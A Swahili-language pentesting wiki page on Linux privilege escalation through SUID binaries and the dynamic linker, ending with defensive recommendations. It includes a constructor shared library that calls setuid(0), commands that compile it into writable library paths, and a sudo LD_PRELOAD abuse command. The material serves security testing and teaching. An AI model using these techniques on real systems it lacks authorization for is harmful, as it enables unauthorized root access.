# Unyanyasaji wa Shared Library na Linker za SUID

{{#include ../../banners/hacktricks-training.md}}

SUID binaries kwa kawaida hukaguliwa kwa ajili ya direct command execution, lakini custom SUID programs pia zinaweza kuwa vulnerable kupitia dynamic linker. Wazo kuu ni rahisi: privileged executable hupakia code kutoka kwenye path au configuration ambayo lower-privileged user anaweza kuathiri.

Ukurasa huu unalenga generic technique patterns: missing libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` kupitia sudo, linker configuration, na mkanganyiko wa SUID hardlink.

## Uchunguzi wa Haraka

Anza kwa kutafuta faili za SUID zisizo za kawaida na kuangalia ikiwa zina dynamic linking:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Zingatia maeneo yasiyo ya kawaida, njia maalum za programu, binaries zinazomilikiwa na root lakini ziko nje ya directories zinazosimamiwa na package, na dependencies zinazopakiwa kutoka kwenye directories zinazoweza kuandikika.

Ukaguzi muhimu wa uwezo wa kuandikika:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Baadhi ya binary maalum za SUID hujaribu kupakia shared object ambayo haipo. Ikiwa path inayokosekana iko chini ya directory inayodhibitiwa na mshambuliaji, binary inaweza kupakia code iliyotolewa na mshambuliaji ikiwa na effective user.

Tafuta library lookups zilizoshindikana:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Ikiwa binary inatafuta `libexample.so` katika path inayoweza kuandikwa, maktaba ndogo ya uthibitisho inaweza kutumia constructor. Weka proof-of-impact ikiwa haina madhara wakati wa validation:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Iunde kwa jina kamili la faili ambalo binary inajaribu kupakia:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Hali inayoweza kutumiwa si library kukosekana pekee. Mshambulizi lazima aweze kuweka shared object inayooana kwenye path ambayo privileged loader itakubali.

## Writable Library Directory

Wakati mwingine dependencies zote zinapatikana, lakini mojawapo ya directories zinazotumika kuzitatua inaweza kuandikika. Hii inaweza kuruhusu kubadilisha library iliyopakiwa au kuingiza library yenye kipaumbele cha juu yenye jina lilelile.

Kagua dependency paths:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Ikiwa directory inaweza kuandikwa, thibitisha kwa kutumia mbinu salama ya nakala katika lab. Kubadilisha system libraries kwenye host inayofanya kazi kunaweza kuvuruga authentication, package management, au huduma muhimu za boot.

## RPATH and RUNPATH

`RPATH` na `RUNPATH` ni entries za dynamic section zinazoambia loader mahali pa kutafuta libraries. Ni hatari katika programu za SUID zinapoelekeza kwenye directories zinazoweza kuandikwa na attacker.

Zitambue:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Mfano wa output hatarishi:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Ikiwa `/opt/app/lib` inaweza kuandikwa na binary inahitaji `libcustom.so`, mshambulizi anaweza kuweka `libcustom.so` hasidi hapo:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` na `RUNPATH` hazifanani katika maelezo yote ya resolution, lakini katika privilege-escalation review swali la msingi ni lilelile: je, binary ya SUID hutafuta directory inayoweza kuandikwa na attacker kwa jina la library?

## LD_PRELOAD, LD_LIBRARY_PATH na SUID

Kwa programs za kawaida, `LD_PRELOAD` na `LD_LIBRARY_PATH` zinaweza kulazimisha au kuathiri upakiaji wa shared object. Kwa programs za SUID, dynamic loader kwa kawaida huingia katika secure-execution mode na kupuuza environment variables hatari.

Hii inamaanisha kuwa binary ya kawaida ya SUID kwa kawaida si vulnerable kwa sababu tu user anaweza kuweka `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Isipokuwa cha kawaida ni sudo misconfiguration. Ikiwa `sudo -l` inaonyesha kwamba variable kama `LD_PRELOAD` au `LD_LIBRARY_PATH` imehifadhiwa, command iliyoruhusiwa na sudo inaweza kupakia code inayodhibitiwa na attacker:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Usichanganye hali hizi:

- `LD_PRELOAD` dhidi ya binary ya kawaida ya SUID: kwa kawaida huzuiwa na secure execution.
- `LD_PRELOAD` iliyohifadhiwa na sudo: inaweza kutumiwa kufanya exploitation.
- `.so` iliyokosekana kwenye path inayoweza kuandikwa: inaweza kutumiwa kufanya exploitation wakati binary ya SUID inapopakia path hiyo kwa kawaida.
- `RPATH`/`RUNPATH` inayoelekeza kwenye directory inayoweza kuandikwa: inaweza kutumiwa kufanya exploitation wakati library inayohitajika inaweza kudhibitiwa.
- Ufikiaji wa kuandika kwenye `/etc/ld.so.preload` au linker config: unaathiri mfumo mzima na una impact kubwa.

## Usanidi wa Linker

Dynamic linker pia husoma system configuration kama vile `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache, na katika baadhi ya hali `/etc/ld.so.preload`.

Ukaguzi muhimu:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration kwa kawaida ni hatari zaidi kuliko binary moja ya SUID iliyo katika mazingira hatarishi, kwa sababu inaweza kuathiri michakato mingi iliyounganishwa dynamically. `/etc/ld.so.preload` ni hatari hasa kwa sababu inaweza kulazimisha shared object kupakiwa kwenye michakato yenye privileges.

## SUID Hardlink Confusion

Hardlinks zinaweza kufanya inode ileile ya SUID ionekane ikiwa na majina mengi. Hii ni muhimu kwa kuficha helper yenye privileges, kuchanganya usafishaji, au kukwepa ukaguzi rahisi unaotegemea path.

Tafuta faili za SUID zilizo na links zaidi ya moja:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Kagua paths zote zinazoelekea inode ileile:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Matumizi mabaya si kwamba hardlink hubadilisha permissions. Matumizi mabaya ni path confusion: inode yenye privileged inaweza kufikiwa kupitia jina ambalo defenders au scripts hawatarajii. Kwa maelezo ya kina kuhusu inode na hardlink workflow, tazama [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Maelezo ya Ulinzi

- Weka SUID binaries kuwa chache, zilizokaguliwa, na zisimamiwe na package management inapowezekana.
- Epuka entries za `RPATH`/`RUNPATH` zinazoelekeza kwenye directories zinazoweza kuandikwa au zinazosimamiwa na application.
- Weka library directories zikimilikiwa na root na zisiweze kuandikwa na regular users.
- Usihifadhi `LD_PRELOAD`, `LD_LIBRARY_PATH`, au loader variables zinazofanana kupitia sudo.
- Fuatilia `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, na SUID files zisizotarajiwa.
- Kagua SUID files zilizo hardlinked na chunguza SUID wrappers maalum zilizo nje ya standard system paths.
